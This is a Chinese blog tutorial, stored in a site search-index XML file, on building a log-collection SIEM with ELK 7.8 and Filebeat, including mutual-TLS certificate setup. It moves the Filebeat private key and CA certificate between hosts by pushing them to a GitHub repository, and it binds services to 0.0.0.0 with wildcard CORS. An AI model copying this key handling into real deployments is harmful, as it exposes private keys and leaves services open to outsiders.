<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>elk笔记三--利用elk+filebeat搭建SIEM系统</title>
      <link href="/2021/02/19/install-guide-elk-filebeats/"/>
      <url>/2021/02/19/install-guide-elk-filebeats/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-整体架构部署"><a href="#1-整体架构部署" class="headerlink" title="1 整体架构部署"></a>1 整体架构部署</h1><p>SIEM全称为security information and event management，即安全信息和事件管理，通俗使用的说，安全信息指的是服务运行中产生的日志信息，事件管理即通过对安全信息进行各种分析方法的总称，如入侵检测等。目前我司一个项目中客户要求SIEM系统，最常见的采用elk+filebeat搭建SIEM系统，用来分析服务器产生的日志：其实初步只做到了安全信息管理，后面如果深入我会继续更新。下面先看下部署的整体架构：filebeat部署在哥哥需要收集日志的机器上，然后在云上部署elk系统，然后filebeat将日志传送到logstash中，然后logstash存到es中，进一步通过kibana进行数据化展示。<a id="more"></a></p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614853265381.png" alt="1614853265381"></p><p>其中涉及的部署主机如下：</p><table><thead><tr><th>部署用途</th><th>主机</th><th>域名</th><th>环境</th></tr></thead><tbody><tr><td>日志产生集群:部署filebeat7.8</td><td>10.65.18.105等</td><td>archery-sec0001.xxx.xx</td><td>centos7</td></tr><tr><td>SIEM系统：部署elk7.8</td><td>10.65.18.112</td><td>archery-sec0002.xxx.xx</td><td>centos7，java8</td></tr></tbody></table><h1 id="2-elk安装"><a href="#2-elk安装" class="headerlink" title="2 elk安装"></a>2 elk安装</h1><p>在10.65.18.112主机上部署elk。其中安装elk教程参考<a href="https://m01ly.github.io/2020/09/11/install-guide-elk-suricata">前面一篇文章</a>即可写的较详细，这里直接列出关键命令。</p><h2 id="2-1-elasticsearch9200"><a href="#2-1-elasticsearch9200" class="headerlink" title="2.1 elasticsearch9200"></a>2.1 elasticsearch9200</h2><p>注意安装ES时候，需要java8的环境。</p><p>安装目录： 一般是装在/usr/share/elasticsearch/下 </p><p>path.data: /var/lib/elasticsearch</p><p>path.logs: /var/log/elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-x86_64.rpmrpm -ivh elasticsearch-7.8.0-x86_64.rpmvim /etc/elasticsearch/elasticsearch.yml<span class="token comment" spellcheck="true">#修改默认配置</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml<span class="token comment" spellcheck="true">#设置内存不使用交换分区</span>bootstrap.memory_lock: <span class="token boolean">false</span><span class="token comment" spellcheck="true">#配置了bootstrap.memory_lock为true时反而会引发9200不会被监听，原因不明</span><span class="token comment" spellcheck="true">#设置允许所有ip可以连接该elasticsearch</span>network.host: 0.0.0.0<span class="token comment" spellcheck="true">#开启监听的端口为9200</span>http.port: 9200http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span><span class="token comment" spellcheck="true">##防止bootstrap报错</span>node.name: node-1bootstrap.system_call_filter: <span class="token boolean">false</span> cluster.initial_master_nodes: <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span> <span class="token function">sudo</span> systemctl start elasticsearch<span class="token comment" spellcheck="true">#启动   </span>curl -X GET http://localhost:9200 <span class="token comment" spellcheck="true">#测试服务是否开启 可以用IP或者域名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1613724861443.png" alt="1613724861443"></p><h2 id="2-2-logstash安装5044"><a href="#2-2-logstash安装5044" class="headerlink" title="2.2 logstash安装5044"></a>2.2 logstash安装5044</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/logstash/logstash-7.8.0.rpmrpm -ivh logstash-7.8.0.rpm<span class="token function">cd</span> /etc/logstash<span class="token comment" spellcheck="true">#进入logstash目录 </span><span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf<span class="token comment" spellcheck="true">#创建配置文件，日志内容输出到elasticsearch中</span>input <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    stdin <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        port <span class="token operator">=</span><span class="token operator">></span> 5044    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>output <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    elasticsearch <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        hosts <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#es主机</span>        index <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"filebeats-%&amp;#123;+YYYY.MM.dd&amp;#125;"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    stdout <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        codec <span class="token operator">=</span><span class="token operator">></span> rubydebug    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span class="token comment" spellcheck="true">#指定logstash.conf配置文件，以后台的方式运用</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> logstash <span class="token comment" spellcheck="true">#查看logstash服务</span><span class="token function">kill</span> -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里注意：如果直接运行systemctl start logstash命令启动logstash，不会加载logstash.conf配置文件。</strong></p><h2 id="2-3-kibana安装5601"><a href="#2-3-kibana安装5601" class="headerlink" title="2.3 kibana安装5601"></a>2.3 kibana安装5601</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/kibana/kibana-7.8.0-x86_64.rpmrpm -ivh kibana-7.8.0-x86_64.rpm<span class="token function">vi</span> /etc/kibana/kibana.yml <span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/kibana/kibana.yml<span class="token comment" spellcheck="true">#kibana页面映射在5601端口 </span>server.port: 5601 <span class="token comment" spellcheck="true">#允许所有ip访问5601端口 </span>server.host: <span class="token string">"0.0.0.0"</span> <span class="token comment" spellcheck="true">#elasticsearch所在的ip及监听的地址 </span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://10.65.18.112:9200"</span><span class="token punctuation">]</span>systemctl start kibana <span class="token comment" spellcheck="true">#启动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-部署filebeat"><a href="#3-部署filebeat" class="headerlink" title="3 部署filebeat"></a>3 部署filebeat</h1><p>在10.65.18.105主机上部署filebeat，具体如下：</p><p>（1）下载安装</p><pre class="line-numbers language-yaml"><code class="language-yaml">sudo wget https<span class="token punctuation">:</span>//artifacts.elastic.co/downloads/beats/filebeat/filebeat<span class="token punctuation">-</span>7.8.0<span class="token punctuation">-</span>x86_64.rpmrpm <span class="token punctuation">-</span>ivh filebeat<span class="token punctuation">-</span>7.8.0<span class="token punctuation">-</span>x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2)配置filebeat，将日志输出到logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/filebeat/filebeat.yml <span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/filebeat/filebeat.yml<span class="token comment" spellcheck="true">#=========================== Filebeat prospectors =============================</span>filebeat.inputs:- type: log  <span class="token comment" spellcheck="true"># Change to true to enable this input configuration.</span>  enabled: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># Paths that should be crawled and fetched. Glob based paths.</span>  paths:    - /var/log/*.log<span class="token comment" spellcheck="true">#这里配置指定目录的日志</span>    <span class="token comment" spellcheck="true">#- c:\programdata\elasticsearch\logs\*</span><span class="token comment" spellcheck="true">#----------------------------- Logstash output --------------------------------</span>output.logstash:  <span class="token comment" spellcheck="true"># The Logstash hosts</span>  <span class="token comment" spellcheck="true">#hosts: ["localhost:5044"]</span>  hosts: <span class="token punctuation">[</span><span class="token string">"xxx.xx:5044"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#这里配置logstash地址，如果是内网最好用域名访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3） 启动filebeat</p><p>运行如下命令启动filebeat</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start filebeat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(4) 查看日志</p><p>如果filebeat可以用systemctl启动成功,则执行下面命令可以看到file beat运行日志，</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status filebeat -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果启动不成功，<a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">有以下两种方法：</a> </p><p>1、查看Linux的rsyslog日志，也就是/var/log/messages这个文件，这个文件日志量比较大，最好使用less命令查看此文件，然后按下大写字母G可翻阅到文件的最后的内容，最后查看是否有关于filebeat的报错语句。</p><p>2、直接使用filebeat的启动方法，而不使用systemctl start filebeat来启动。比如：</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebeat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这次就是直接使用这个命令，给我报错是127行有问题，然后</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">cat</span> -n  /etc/filebeat/filebeat.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我就着重修改了一下，最后启动成功了。</p><h1 id="4-启动"><a href="#4-启动" class="headerlink" title="4  启动"></a>4  启动</h1><p>首先开启elk,然后在部署filebeat的主机上（10.65.18.105）输入如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"删除用户"</span> <span class="token operator">>></span> /var/log/admin.log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器输入：ip/域名：5601，可以在Stack Management–&gt;Index Management下看到该index，filebeat-20210304，即证明filebeat将日志传送到elk上成功了。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614854689893.png" alt="1614854689893"></p><p>还可以去Dev Tools搜索相关数据</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614852084050.png" alt="1614852084050"></p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614852141941.png" alt="1614852141941"></p><h1 id="5-配置多目录收集-待完善"><a href="#5-配置多目录收集-待完善" class="headerlink" title="5 配置多目录收集-待完善"></a>5 配置多目录收集-待完善</h1><p>vi /etc/filebeat/filebeat.yml </p><p>/home/envuser/energy-os/*</p><pre class="line-numbers language-bash"><code class="language-bash">/home/envuser/energy-os/*/logs/*.log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5-ES设置登录"><a href="#5-ES设置登录" class="headerlink" title="5 ES设置登录"></a>5 ES设置登录</h1><p>ES默认是没有加认证的，因此外界可以直接访问地址获取数据库信息，造成隐私泄露，这里我们采用X-pack为ES加上登录，具体操作可参考<a href="https://m01ly.github.io/2020/09/11/elk-login/">elk笔记二–通过X-Pack权限控制设置elk登录</a>，这里给出logstash配置（/etc/logstash/conf.d/logstash.conf）参考如下：</p><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>    stdin &amp;<span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats &amp;<span class="token comment" spellcheck="true">#123;</span>        port =<span class="token punctuation">></span> 5044    &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>    elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>        hosts =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>        index =<span class="token punctuation">></span> "filebeats<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>        user =<span class="token punctuation">></span> "elastic"<span class="token comment" spellcheck="true">#登录ES的账户</span>        password =<span class="token punctuation">></span> "xxx"<span class="token comment" spellcheck="true">#登录ES的密码口令</span>    &amp;<span class="token comment" spellcheck="true">#125;</span>    stdout &amp;<span class="token comment" spellcheck="true">#123;</span>        codec =<span class="token punctuation">></span> rubydebug     &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-filebeat和logstash加密传输配置"><a href="#6-filebeat和logstash加密传输配置" class="headerlink" title="6   filebeat和logstash加密传输配置"></a>6   filebeat和logstash加密传输配置</h1><h2 id="6-1-生成证书"><a href="#6-1-生成证书" class="headerlink" title="6.1 生成证书"></a>6.1 生成证书</h2><p>本文采用openssl生成证书，根证书目前使用的是自签证书（即内置的公钥可验证该证书本身），命名为ca.crt。本文配置的是双向证书，即filebeat和logstash交互共需要两套证书，这里我采用从同一CA签发（当然两套也可以采用不同的两个CA签发），分别为logstash.crt和filebeat.crt。（也可以使用 直接利用的<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.5/certutil.html">Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil</a>来制作需要的证书，可以参考<a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">Filebeat与Logstash配置SSL加密通信</a> ）</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615361929310.png" alt="1615361929310"></p><p>logstash端应该有的证书：ca.crt,logstash,crt.logstash.key</p><p>filebeat端应该有的证书：ca.crt,filebeat,crt.filebeat.key</p><p>利用openssl生成证书很方便，只需要主机上装openssl即可，运行openssl version查看版本，若没安装，运行以下命令安装：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> opensslyum <span class="token function">install</span> openssl-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先生成证书机器的选择可以随意，这里我选择在logstash主机上生成所有的证书，然后将filebeat的证书拷贝到其机器即可。</p><h3 id="6-1-1-制作自签的CA证书"><a href="#6-1-1-制作自签的CA证书" class="headerlink" title="6.1.1 制作自签的CA证书"></a>6.1.1 制作自签的CA证书</h3><p>（1）创建certs证书目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/logstash/certs<span class="token function">cd</span> /etc/logstash/certs<span class="token comment" spellcheck="true">#进入证书目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）生成ca密钥</p><pre class="line-numbers language-bash"><code class="language-bash">openssl genrsa 2048 <span class="token operator">></span> ca.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615362913575.png" alt="1615362913575"></p><p>（3）使用ca私钥建立ca证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -x509 -nodes -days 3650 -key ca.key -out ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的是参数Common Name为域名，这里填为*.eniot.io，其他参数可以直接enter为空。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615362976782.png" alt="1615362976782"></p><h3 id="6-1-2-制作logstash使用的证书"><a href="#6-1-2-制作logstash使用的证书" class="headerlink" title="6.1.2  制作logstash使用的证书"></a>6.1.2  制作logstash使用的证书</h3><p>继续在logstash主机的/etc/logstash/certs目录下生成。</p><p>（1）生成logstash服务器csr证书请求文件</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -newkey rsa:2048 -days 3650 -nodes -keyout logstash.key -out logstash.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的参数为Common Name为logstash服务的域名：*.eniot.io，challenge password为为该证书请求文件设置密码，这里可以直接为空即可；其他参数直接enter为空即可。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363233359.png" alt="1615363233359"></p><p>（2）使用ca证书与ca私钥，请求文件logstash.csr签发服务器证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -req -in logstash.csr -days 3650 -CA ca.crt -CAkey ca.key -set_serial 01 <span class="token operator">></span> logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363431449.png" alt="1615363431449"></p><p>至此logstash需要的证书已经生成完成：ca.crt,logstash.crt,logstash.key</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363508360.png" alt="1615363508360"></p><h3 id="6-1-3-制作filebeat使用的证书"><a href="#6-1-3-制作filebeat使用的证书" class="headerlink" title="6.1.3  制作filebeat使用的证书"></a>6.1.3  制作filebeat使用的证书</h3><p>继续在logstash主机的/etc/logstash/certs目录下生成。</p><p>（1）生成filebeat服务器csr证书请求文件</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -newkey rsa:2048 -days 3650 -nodes -keyout filebeat.key -out filebeat.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的参数为Common Name为filebeat服务的域名：*.eniot.io，challenge password为为该证书请求文件设置密码，这里可以直接为空即可；其他参数直接enter为空即可。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363607580.png" alt="1615363607580"></p><p>（2）使用ca证书与ca私钥，请求文件filebeat.csr签发服务器证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -req -in filebeat.csr -days 3650 -CA ca.crt -CAkey ca.key -set_serial 01 <span class="token operator">></span> filebeat.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615366665677.png" alt="1615366665677"></p><p>至此filebeat所需要的证书ca.crt,filebeat.crt,filebeat.key已经生成完毕。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363783351.png" alt="1615363783351"></p><h3 id="6-1-4-检查生成的openssl证书"><a href="#6-1-4-检查生成的openssl证书" class="headerlink" title="6.1.4 检查生成的openssl证书"></a>6.1.4 检查生成的openssl证书</h3><p>（1）查看KEY信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -noout -text -in ca.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看CSR信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -noout -text -in logstash.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）查看证书信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -noout -text -in ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）验证证书</p><p>会提示self signed</p><pre class="line-numbers language-bash"><code class="language-bash">openssl verify logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5） 因为myserver.crt 是幅ca.crt发布的，所以会验证成功</p><pre class="line-numbers language-bash"><code class="language-bash">openssl verify -CAfile ca.crt logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>去掉key的密码保护</p><p>有时候每次都要输入密码太繁琐了,可以把Key的保护密码去掉</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -in logstash.key -out logstash.key.insecure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2-配置证书"><a href="#6-2-配置证书" class="headerlink" title="6.2 配置证书"></a>6.2 配置证书</h2><h3 id="6-2-1-logstash配置证书"><a href="#6-2-1-logstash配置证书" class="headerlink" title="6.2.1 logstash配置证书"></a>6.2.1 logstash配置证书</h3><p>（1）/etc/logstash/conf.d/logstash.conf上配置证书路径</p><p>主要需要修改是input节中设置ssl的参数，具体参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf input <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    stdin <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        port <span class="token operator">=</span><span class="token operator">></span> 5044        ssl <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>        ssl_certificate_authorities <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"/etc/logstash/certs/ca.crt"</span><span class="token punctuation">]</span>        ssl_certificate <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/etc/logstash/certs/logstash.crt"</span>        ssl_key <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/etc/logstash/certs/logstash.key"</span>        ssl_verify_mode <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"force_peer"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>output <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    elasticsearch <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        hosts <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"xxxx:9200"</span><span class="token punctuation">]</span>        index <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"filebeats-%&amp;#123;+YYYY.MM.dd&amp;#125;"</span>        user <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"elastic"</span>        password <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"xxxx"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    stdout <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        codec <span class="token operator">=</span><span class="token operator">></span> rubydebug     <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）查看logstash进程，并kill掉</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span><span class="token function">grep</span> logstash<span class="token comment" spellcheck="true">#查看logstash进程</span><span class="token function">kill</span> -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）重新启动logstash，这里不要以后台方式运行，直接运行下面命令，如果出错可以看到错误信息。没有出错信息就继续往下（不要用systemctl start logstash启动方式，因为该方式不会加载logstash.conf配置文件启动）</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）带证书访问logstash</p><p> 在运行Filebeat之前 ,另外开个终端，<a href="https://www.elastic.co/guide/en/beats/filebeat/6.5/configuring-ssl-logstash.html#testing-ssl-logstash">带证书访问</a>，可以使用curl来验证logstash证书是否成功（启动logstash后，再带证书访问时，可能会有延迟，多试几次）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#带证书访问：</span>curl -v --cacert /etc/logstash/certs/ca.crt https://域名:5044curl -v --cacert /etc/logstash/certs/ca.crt https://ip:5044<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回如下信息则连接成功：</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615364370400.png" alt="1615364370400"></p><p>返回如下信息则连接失败：<img src="/2021/02/19/install-guide-elk-filebeats/1615364645594.png" alt="1615364645594"></p><p>（5）后台方式运行logstash</p><p>证书访问成功后，即可以后台方式长时间运行logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-2-2-复制filebeat证书"><a href="#6-2-2-复制filebeat证书" class="headerlink" title="6.2.2 复制filebeat证书"></a>6.2.2 复制filebeat证书</h3><p>因为之前的证书都是再logstash主机上生成的，因此我们需要吧filebeat相关证书（ca.crt,filebeat.crt,filebeat.key）从logstash主机复制filebeat主机。这里如果知道主机账户密码可以直接用scp命令，直接看6.2.3节。因为我使用的是堡垒机，不知道主机密码，因为我开始使用的是堡垒机文件夹的上传下载功能，突然发现堡垒机的这个功能有巨坑：上传下载有大小限制，所以这样传过去的证书是不完整的，用起来会一直报no pem file /etc/filebeat/certs/filebeat.crt; file is not a certificate adding/etc/filebeat/certs/ca.pem to the list of known CAs错误，这个真的坑死我了，弄了好久才发现。后面尝试用git来运输文件。</p><h4 id="6-2-2-1-logstash主机上传文件到git"><a href="#6-2-2-1-logstash主机上传文件到git" class="headerlink" title="6.2.2.1 logstash主机上传文件到git"></a>6.2.2.1 logstash主机上传文件到git</h4><p>上传ca.crt  filebeat.key filebeat.crt，3个文件到git：</p><p>（1）进入证书目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/logstash/certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）下载git项目(随便建一个，或者用已经存在的)，并ca.crt  filebeat.key filebeat.crt将复制到项目文件夹gitalk</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/m01ly/gitalk<span class="token function">cp</span> filebeat.crt gitalk/<span class="token function">cp</span> ca.crt gitalk/<span class="token function">cp</span> filebeat.key gitalk/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365664125.png" alt="1615365664125"></p><p>（2）添加所有需要上传的文件和配置到git</p><p><code>git add FILE</code>添加确定的文件FILE<br><code>git add .</code>添加当前目录下所有文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> gitalk<span class="token punctuation">[</span>root@xxxx gitalk<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git add .</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）提交文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> commit -m <span class="token string">'filebeat log message'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述命令<strong>必须添加</strong>‘-m’及‘log message’，其中log message可以自己随便填写，否则是提交不成功的，在后面的<strong>push操作</strong>中会提示错误：“error:src refspec master does not match any”</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365765658.png" alt="1615365765658"></p><p>至此，我们就已经<strong>提交文件到本地仓库</strong>了！</p><p>现在我们需要将上述本地仓库里的文件<strong>添加到远程库</strong>！</p><p>（4）在github里添加origin</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote add origin https://github.com/m01ly/gitalk.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果之前配置过一次，再次配置则会提示以下错误：<br><strong>ERROR</strong>：远程 origin 已经存在。<br>此时只需要将远程配置删除，重新添加即可；</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token function">rm</span> origin<span class="token function">git</span> remote add origin https://github.com/m01ly/gitalk.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再次提交文件即可正常使用</p><p>（5）上传文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> push -u origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365843590.png" alt="1615365843590"></p><p>网页访问git，发现文件上传成功</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365900784.png" alt="1615365900784"></p><h4 id="6-2-2-2-filebeat主机从git下载文件"><a href="#6-2-2-2-filebeat主机从git下载文件" class="headerlink" title="6.2.2.2 filebeat主机从git下载文件"></a>6.2.2.2 filebeat主机从git下载文件</h4><p>以下全程再filebeat主机上操作。</p><p>（1）进入证书目录，下载git项目</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/filebeat/<span class="token function">git</span> clone https://github.com/m01ly/gitalk<span aria-hidden="true" 